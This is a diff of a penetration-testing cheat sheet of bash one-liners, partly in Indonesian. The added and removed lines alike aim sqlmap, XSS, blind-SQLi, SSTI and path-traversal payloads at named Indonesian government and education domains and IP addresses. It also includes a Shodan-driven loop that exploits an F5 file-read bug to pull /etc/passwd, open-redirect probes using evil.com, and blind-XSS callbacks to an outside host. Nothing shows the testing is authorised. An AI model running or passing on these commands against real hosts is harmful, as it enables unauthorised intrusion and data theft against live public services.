@@ -1,116 +1,90 @@
+### Enumerasi
+```bash
+# Subdomain enumeration using subfinder and amass
+subfinder -dL /home/kali/Tools/Aman.txt -o subfinder.txt
+amass enum -passive -norecursive -noalts -df /home/kali/Tools/Aman.txt -o amass.txt
 
-# SQL Injection with sqlmap
-sqlmap -r zeroweb.txt --dbs --risk=3 --level=3 --tamper=between --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36" --cookie="JSESSIONID=D1438CD5; username=username; password=password"
+# Nmap scanning with specified ports and scripts
+nmap -Pn -A -sV -sC 118.98.222.11 -p 17,80,20,21,22,23,24,25,53,69,80,123,443,1723,4343,8081,8082,8088,53,161,177,3306,8888,27017,27018,139,137,445,8080,8443 -oN scan-result.txt --script=vuln
 
-# Redirection attack with pwnredir
-python2 pwnredir.py -u https://admin.kampusmerdeka.staging.belajar.id -f payloads.list
+# Finding subdomains with sublist3r
+sublist3r -d https://wkmb-dev.kemdikbud.go.id/ -o sublist3r.txt
+```
 
-# XSS attack with pwnxss
-python3 pwnxss.py -u https://118.98.222.15/web/
+### XSS (Cross-Site Scripting)
+```bash
+# XSS detection using dalfox
+dalfox file /home/kali/Tools/Aman.txt -b https://hahwul.xss.ht -o Vulnerable_XSS.txt
 
-# SSRF attack with pwnssrf
-python3 pwnssrf.py -H https://wkmb-dev.kemdikbud.go.id/
+# XSS payloads using waybackurls and curl
+waybackurls https://buku-sibi.netlify.app/ | gf xss | grep '=' | qsreplace '"><script>confirm(1)</script>' | while read host; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n"; done
 
-# Directory traversal attack with dotdotslash
-python3 dotdotslash.py -u https://wkmb-dev.kemdikbud.go.id/
-
-# WebSocket scan
-python ws.py -t 
-
-# Vulnerability mapping with vulmap
-python vulmap.py -u https://118.98.221.43/
-
-# Cross-Site Scripting (XSS) payloads
-cat /home/kali/Tools/Aman.txt | gf xss >> XSS.txt
-dalfox file /home/kali/Tools/Aman.txt -o Vulnerable_XSS.txt
+# Finding reflected XSS with Gxss
 cat /home/kali/Tools/Aman.txt | Gxss -p khXSS -o XSS_Ref.txt
+```
 
-# Main script execution
-python main.py --file /home/kali/Tools/Aman.txt --thread 15
+### SQL Injection (SQLi)
+```bash
+# SQLi detection using sqlmap
+sqlmap -u https://sinde-tes.kemdikbud.go.id/login --dbs --forms --crawl=2
+sqlmap -g /home/kali/Tools/Aman.txt --dbs --forms --crawl=2
 
-# Example URL with potential XSS
-http://118.98.222.9/data_referensi2.php?id=010000%27%26%23x27%3B%3E%3CiFrAme%2Fsrc%3DjaVascRipt%3Aprompt.valueOf%28%29%281%29%3E%3C%2FiFramE%3E&page=2
+# Automated SQLi payloads and detection with sqlmap
+subfinder -dL /home/kali/Tools/Aman.txt | dnsx | waybackurls | uro | grep "?" | head -20 | httpx -silent > urls; sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
 
-# Subdomain finder with status code check
-subfinder -dL /home/kali/Tools/Aman.txt | httpx -status-code 
+# Blind SQLi time-based payloads
+cat /home/kali/Tools/Aman.txt | grep "=" | qsreplace "1 AND (SELECT 5230 FROM (SELECT(SLEEP(10)))SUmc)"> blindsqli.txt
+```
 
-# CORS misconfiguration example URL
-https://siplah-dashboard.staging.belajar.id/login/?site=evil.com?site=evil.com
+### CORS Misconfiguration
+```bash
+# CORS scanning using CORS-Scanner and corscanner
+python3 corsy.py -i /home/kali/Tools/Aman.txt
+cat /home/kali/Tools/Aman.txt | CORS-Scanner
+corscanner -i /home/kali/Tools/Aman.txt -v -t 100
+```
 
-# Joker attack script
-python3 jok3r.py attack -t wkmb-dev.kemdikbud.go.id -s http --cat-only vulnscan --add2db hackingloops
+### Specific Vulnerability Scanning using Nuclei
+```bash
+# Scanning for specific vulnerabilities using Nuclei templates
+nuclei -u https://wkmb-dev.kemdikbud.go.id -w nuclei-templates/cloud/aws/aws-code-env.yaml
+nuclei -list /home/kali/Tools/Aman.txt -t /root/nuclei-templates/vulnerabilities -t /root/nuclei-templates/cves -t /root/nuclei-templates/exposures -t /root/nuclei-templates/sqli.yaml
 
-# Log sensor script execution
-python3 logsensor.py -f /home/kali/Tools/Aman.txt
-python logsensor.py -f /home/kali/Tools/Aman.txt --sqli 
+# WordPress workflow
+nuclei -list http_urls.txt -w workflows/wordpress-workflow.yaml
 
-# SQLi with hbsqli
-python3 hbsqli.py -l /home/kali/Tools/Aman.txt -p payloads.txt -H headers.txt -v
+# Exposures in Symfony configuration
+nuclei -list /home/kali/Tools/Aman.txt -w nuclei-templates/http/exposures/configs/symfony-profiler.yaml
+```
 
-# Additional URLs
-https://siplah-dashboard.staging.belajar.id/login
-/home/kali/Tools/Aman.txt
-http://118.98.222.7/api/article/admin/published?page=4
+### Parameter Discovery
+```bash
+# Parameter discovery using Arjun
+arjun -u https://sinde-tes.kemdikbud.go.id/login -w burp-parameter-names.txt
+arjun -u https://118.98.233.186:30443/login -w /home/kali/SecLists/Discovery/Web-Content/burp-parameter-names.txt
+```
 
-# Shodan search with specific query
-shodanx custom -cq '"Server: Check Point SVN" "X-UA-Compatible: IE=EmulateIE7" 200' -fct ip -o /home/kali/Tools/Aman.txt
-
-# Exploit script execution
-python3 exploit.py -l /home/kali/Tools/Aman.txt -t 200 -o output.txt -ftd /etc/passwd
-
-# GoChopChop scan
-./gochopchop scan --url-file /home/kali/Tools/Aman.txt
-
-# Xray scan with specific plugins
-./xray_linux_amd64 ws --basic-crawler https://wkmb-dev.kemdikbud.go.id --plugins cmd-injection,sqldet --html-output 118.98.222.15.html 
-
-# Subdomain enumeration and scan
-subfinder -dL /home/kali/Tools/Aman.txt -all -recursive > subaman.txt 
-
-# URL redirection check
-echo "http://118.98.222.7/" | waybackurls | gf redirect
-
-# XSS payload testing
-echo | httpx -silent | hakrawler -subs | grep "=" | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'
-waybackurls http://118.98.222.7/ | urldedupe -qs | bhedak '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'
-cat /home/kali/Tools/Aman.txt | anew | httpx -silent -threads 500 | xargs -I@ dalfox url @
-
-# Nmap scan with parallel processing
-mkdir nmap; cat /home/kali/Tools/Aman.txt | parallel -j 35 nmap {} -sTVC -host-timeout 15m -oN nmap/{} -p 22,80,443,8080 --open > /dev/null 2>&1; cd nmap; grep -Hari "/tcp" | tee -a ../services.txt; cd ../
-
-# HTTPX path check
-subfinder -dL /home/kali/Tools/Aman.txt -silent -all | httpx -silent -ports http:80,https:443,2082,2083 -path 'cpanelwebcall/<img%20src=x%20onerror="prompt(document.domain)">aaaaaaaaaa' -mc 400
-
-# Curl XSS vulnerability check
-cat /home/kali/Tools/Aman.txt | while read host do; do curl -sk "$host/appliance/login.ns?login%5Bpassword%5D=test%22%3E%3Csvg/onload=alert(document.domain)%3E&login%5Buse_curr%5D=1&login%5Bsubmit%5D=Change%20Password" | grep -qs '"><svg/onload=alert(document.domain)>' && echo "$host: Vuln" || echo "$host: Not Vuln"; done
-
-# Nuclei scan for subdomains
-subfinder -dL /home/kali/Tools/Aman.txt -all -silent | httpx -silent | nuclei -rl 50 -c 15 -timeout 10 -tags cisa -vv
-
-# Server-Side Template Injection (SSTI) check
-cat /home/kali/Tools/Aman.txt | subfinder -silent | waybackurls | gf ssti | qsreplace "{{''.class.mro[2].subclasses()[40]('/etc/passwd').read()}}" | parallel -j50 -q curl -g | grep  "root:x"
-
-# Redirect check with waybackurls and HTTPX
-subfinder -dL /home/kali/Tools/Aman.txt -all -silent | waybackurls | sort -u | gf redirect | qsreplace 'https://example.com' | httpx -fr -title --match-string 'Example Domain'
-
-# SQL injection with subfinder and sqlmap
-subfinder -d http://118.98.222.7/api/article/admin/published?page=4 -all -silent | waybackurls | sort -u | gf sqli > gf_sqli.txt; sqlmap -m gf_sqli.txt --batch --risk 3 --random-agent | tee -a sqli.txt
-
-# DNS probe for specific subdomains
-subfinder -dL home/kali/Tools/Aman.txt -all | dnsprobe -silent | cut -d ' ' -f1 | grep --color 'dmz\|api\|staging\|env\|v1\|stag\|prod\|dev\|stg\|test\|demo\|pre\|admin\|beta\|vpn\|cdn\|coll\|sandbox\|qa\|intra\|extra\|s3\|external\|back'
-
-# Naabu and HTTPX for JSON files
-subfinder -dL /home/kali/Tools/Aman.txt -all | naabu | httpx | waybackurls | grep -E ".json(?:onp?)?$"
-
-# Nuclei scan for subdomain templates
-subfinder -d wkmb-dev.kemdikbud.go.id -all | naabu | httpx | nuclei -t nuclei-templates
-
-# SQL injection scan with findomain and sqlmap
-findomain -t https://wkmb-dev.kemdikbud.go.id/ -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1
-
-# Jaeles scan for subdomains
+### HTTP Probing and Waybackurls
+```bash
+# Extract URLs and probe HTTP
+cat /home/kali/Tools/Aman.txt | waybackurls | grep "?" | uro | httpx -silent > urls; sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
 cat /home/kali/Tools/Aman.txt | anew | httpx -silent -threads 500 | xargs -I@ jaeles scan -s /jaeles-signatures/ -u @
-chaos -d https://wkmb-dev.kemdikbud.go.id/ | httpx -silent | anew | xargs -I@ jaeles scan -c 100 -s /jaeles-signatures/ -u @ 
 
-# SSRF vulnerability check with curl
-cat /home/kali/Tools/Aman.txt | assetfinder --subs-only| httprobe | while read url; do xss1=$(curl -s -L $url -H 'X-Forwarded-For: xss.yourburpcollabrotort'|grep xss) xss2=$(curl -s -L $url -H 'X-Forwarded-Host: xss.yourburpcollabrotort'|grep xss) xss
+# Using gau and hakrawler for URL discovery
+echo https://wkmb-dev.kemdikbud.go.id | hakrawler > testphp.txt && cat testphp.txt | grep -o "http[^ ]*" > testphp_filter_urls.txt && cat testphp_filter_urls.txt | grep = > testphp_parameter_urls.txt
+```
+
+### Miscellaneous
+```bash
+# Using httpx for status code checking
+httpx -l /home/kali/Tools/Aman.txt -path "///evil.com" -status-code -mc 302
+
+# Shodan for reconnaissance
+shodan search http.favicon.hash:-1252041730 "3992" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host; do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n"; done
+
+# Running various python scripts for specific vulnerabilities
+python2 pwnredir.py -u https://admin.kampusmerdeka.staging.belajar.id -f payloads.list
+python3 pwnxss.py -u https://118.98.222.15/web/
+python3 pwnssrf.py -H https://wkmb-dev.kemdikbud.go.id/
+python3 dotdotslash.py -u https://wkmb-dev.kemdikbud.go.id/
+```
